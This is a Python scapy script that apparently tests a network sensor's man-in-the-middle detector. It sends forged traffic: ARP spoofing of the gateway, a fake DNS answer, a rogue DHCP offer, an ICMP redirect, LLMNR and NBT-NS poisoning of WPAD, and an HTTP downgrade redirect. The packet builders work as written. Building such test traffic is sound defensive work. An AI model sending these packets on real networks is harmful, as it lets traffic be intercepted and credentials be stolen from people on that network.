#!/usr/bin/env python3
"""
mitm_test.py — MiTM Detection Test Script
==========================================
Generates simulated MiTM attack traffic to validate mitm_detector.py.
Run from an attacker machine (e.g. ZION) targeting the sensor's network.

Requires: scapy (pip install scapy), root privileges.

Tests:
  1. ARP Spoofing      — fake ARP reply claiming gateway's IP with attacker MAC
  2. DNS Spoofing       — fake DNS response from non-trusted server
  3. DHCP Rogue Server  — fake DHCP Offer from attacker IP
  4. ICMP Redirect      — ICMP redirect message pointing to attacker
  5. LLMNR Poisoning    — fake LLMNR response (UDP 5355)
  6. NBT-NS Poisoning   — fake NBT-NS response (UDP 137)
  7. SSL Strip hint     — HTTP 302 redirect with http:// Location

Usage:
    sudo python3 mitm_test.py --target 192.0.2.10 --gateway 192.0.2.1
    sudo python3 mitm_test.py --target 192.0.2.10 --gateway 192.0.2.1 --test arp
"""

import argparse
import sys
import time

try:
    from scapy.all import (
        ARP,
        BOOTP,
        DHCP,
        DNS,
        DNSQR,
        DNSRR,
        ICMP,
        IP,
        TCP,
        UDP,
        Ether,
        Raw,
        conf,
        get_if_hwaddr,
        send,
        sendp,
    )
except ImportError:
    print("ERROR: scapy required. Install: pip install scapy", file=sys.stderr)
    sys.exit(1)


def get_mac(iface):
    return get_if_hwaddr(iface)


def test_arp_spoof(target_ip, gateway_ip, iface, count=5):
    """Send gratuitous ARP replies claiming to be the gateway."""
    print(f"\n[1] ARP SPOOF: Telling {target_ip} that {gateway_ip} is at {get_mac(iface)}")
    attacker_mac = get_mac(iface)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,  # ARP reply
        psrc=gateway_ip,
        hwsrc=attacker_mac,
        pdst=target_ip,
    )
    for i in range(count):
        sendp(pkt, iface=iface, verbose=False)
        print(f"    Sent ARP reply {i + 1}/{count}: {gateway_ip} is-at {attacker_mac}")
        time.sleep(0.5)
    print("    [OK] ARP spoof packets sent")


def test_dns_spoof(target_ip, iface):
    """Send a fake DNS response from attacker IP (non-trusted source)."""
    print(f"\n[2] DNS SPOOF: Sending fake DNS response to {target_ip}")
    pkt = (
        IP(dst=target_ip)
        / UDP(sport=53, dport=12345)
        / DNS(
            id=0x1234,
            qr=1,  # response
            aa=1,
            qd=DNSQR(qname="evil.example.com"),
            an=DNSRR(rrname="evil.example.com", rdata="6.6.6.6", ttl=300),
        )
    )
    send(pkt, iface=iface, verbose=False)
    print("    Sent DNS response: evil.example.com -> 6.6.6.6 (from attacker)")
    print("    [OK] DNS spoof packet sent")


def test_dhcp_rogue(target_ip, iface):
    """Send a fake DHCP Offer from attacker (rogue DHCP server)."""
    print("\n[3] DHCP ROGUE: Sending fake DHCP Offer")
    attacker_mac = get_mac(iface)
    pkt = (
        IP(src="192.0.2.44", dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,  # Boot Reply
            chaddr=bytes.fromhex(attacker_mac.replace(":", "")),
            yiaddr="192.0.2.200",
            siaddr="192.0.2.44",
        )
        / DHCP(
            options=[
                ("message-type", "offer"),
                ("server_id", "192.0.2.44"),
                ("lease_time", 3600),
                ("subnet_mask", "255.255.255.0"),
                ("router", "192.0.2.44"),
                ("name_server", "192.0.2.44"),
                "end",
            ]
        )
    )
    send(pkt, iface=iface, verbose=False)
    print("    Sent DHCP Offer: your IP=192.0.2.200, router=192.0.2.44 (attacker)")
    print("    [OK] DHCP rogue packet sent")


def test_icmp_redirect(target_ip, gateway_ip, iface):
    """Send ICMP redirect telling target to route via attacker."""
    print(f"\n[4] ICMP REDIRECT: Telling {target_ip} to route via attacker")
    # ICMP Type 5 Code 1 = Redirect for Host
    pkt = (
        IP(src=gateway_ip, dst=target_ip)
        / ICMP(type=5, code=1, gw="192.0.2.44")
        / IP(src=target_ip, dst="8.8.8.8")
        / UDP(sport=12345, dport=53)
    )
    send(pkt, iface=iface, verbose=False)
    print("    Sent ICMP redirect: route 8.8.8.8 via 192.0.2.44 (attacker)")
    print("    [OK] ICMP redirect packet sent")


def test_llmnr_poison(target_ip, iface):
    """Send fake LLMNR response (UDP 5355) — Responder-style."""
    print(f"\n[5] LLMNR POISONING: Sending fake LLMNR responses to {target_ip}")
    for _i in range(5):
        pkt = (
            IP(dst=target_ip)
            / UDP(sport=5355, dport=5355)
            / Raw(
                load=(
                    b"\x00\x01"  # Transaction ID
                    b"\x80\x00"  # Flags: response
                    b"\x00\x01"  # Questions: 1
                    b"\x00\x01"  # Answers: 1
                    b"\x00\x00\x00\x00"  # Authority/Additional: 0
                    b"\x04WPAD\x00"  # Query: WPAD
                    b"\x00\x01\x00\x01"  # Type A, Class IN
                    b"\x04WPAD\x00"  # Answer: WPAD
                    b"\x00\x01\x00\x01"  # Type A, Class IN
                    b"\x00\x00\x00\x1e"  # TTL: 30
                    b"\x00\x04"  # Data length: 4
                    b"\xc0\x00\x02\x2c"  # 192.0.2.44 (attacker)
                )
            )
        )
        send(pkt, iface=iface, verbose=False)
        time.sleep(0.3)
    print("    Sent 5 LLMNR responses: WPAD -> 192.0.2.44 (attacker)")
    print("    [OK] LLMNR poisoning packets sent")


def test_nbtns_poison(target_ip, iface):
    """Send fake NBT-NS response (UDP 137) — Responder-style."""
    print(f"\n[6] NBT-NS POISONING: Sending fake NBT-NS responses to {target_ip}")
    for _i in range(5):
        pkt = (
            IP(dst=target_ip)
            / UDP(sport=137, dport=137)
            / Raw(
                load=(
                    b"\x00\x02"  # Transaction ID
                    b"\x85\x00"  # Flags: response, authoritative
                    b"\x00\x00"  # Questions: 0
                    b"\x00\x01"  # Answers: 1
                    b"\x00\x00\x00\x00"  # Authority/Additional: 0
                    b"\x20"  # Name length (NetBIOS encoded)
                    b"FHEPFCELEHFCEPFFFACACACACACACACA"  # "WPAD" in NetBIOS
                    b"\x00"  # Name terminator
                    b"\x00\x20\x00\x01"  # Type NB, Class IN
                    b"\x00\x00\x00\x1e"  # TTL: 30
                    b"\x00\x06"  # Data length: 6
                    b"\x00\x00"  # Flags
                    b"\xc0\x00\x02\x2c"  # 192.0.2.44 (attacker)
                )
            )
        )
        send(pkt, iface=iface, verbose=False)
        time.sleep(0.3)
    print("    Sent 5 NBT-NS responses: WPAD -> 192.0.2.44 (attacker)")
    print("    [OK] NBT-NS poisoning packets sent")


def test_sslstrip(target_ip, iface):
    """Send HTTP 302 redirect with http:// Location (SSL strip indicator)."""
    print(f"\n[7] SSL STRIP: Sending HTTP 302 with http:// downgrade to {target_ip}")
    http_response = (
        b"HTTP/1.1 302 Found\r\n"
        b"Server: nginx\r\n"
        b"Location: http://www.google.com/\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n"
    )
    pkt = (
        IP(dst=target_ip)
        / TCP(sport=80, dport=44444, flags="PA", seq=1000, ack=1000)
        / Raw(load=http_response)
    )
    send(pkt, iface=iface, verbose=False)
    print("    Sent HTTP 302 redirect: Location: http://www.google.com/ (downgrade)")
    print("    [OK] SSL strip packet sent")


ALL_TESTS = {
    "arp": test_arp_spoof,
    "dns": test_dns_spoof,
    "dhcp": test_dhcp_rogue,
    "icmp": test_icmp_redirect,
    "llmnr": test_llmnr_poison,
    "nbtns": test_nbtns_poison,
    "sslstrip": test_sslstrip,
}


def main():
    parser = argparse.ArgumentParser(description="MiTM Detection Test Script")
    parser.add_argument("--target", required=True, help="Target sensor IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--iface", default="enp6s0f4u1", help="Network interface")
    parser.add_argument(
        "--test", choices=list(ALL_TESTS.keys()), help="Run single test (default: all)"
    )
    args = parser.parse_args()

    import os

    if os.geteuid() != 0:
        print("ERROR: Must run as root (sudo)", file=sys.stderr)
        sys.exit(1)

    conf.iface = args.iface
    print("=" * 60)
    print("MiTM Detection Test Script")
    print("=" * 60)
    print(f"Attacker:  {get_mac(args.iface)} ({args.iface})")
    print(f"Target:    {args.target}")
    print(f"Gateway:   {args.gateway}")
    print("=" * 60)

    if args.test:
        fn = ALL_TESTS[args.test]
        if args.test == "arp":
            fn(args.target, args.gateway, args.iface)
        elif args.test in ("dns", "dhcp", "llmnr", "nbtns", "sslstrip"):
            fn(args.target, args.iface)
        elif args.test == "icmp":
            fn(args.target, args.gateway, args.iface)
    else:
        test_arp_spoof(args.target, args.gateway, args.iface)
        time.sleep(1)
        test_dns_spoof(args.target, args.iface)
        time.sleep(1)
        test_dhcp_rogue(args.target, args.iface)
        time.sleep(1)
        test_icmp_redirect(args.target, args.gateway, args.iface)
        time.sleep(1)
        test_llmnr_poison(args.target, args.iface)
        time.sleep(1)
        test_nbtns_poison(args.target, args.iface)
        time.sleep(1)
        test_sslstrip(args.target, args.iface)

    print("\n" + "=" * 60)
    print("All tests complete. Check sensor logs:")
    print(f"  ssh {args.target} journalctl -u sensor-mitm --since '2 min ago'")
    print("=" * 60)


if __name__ == "__main__":
    main()
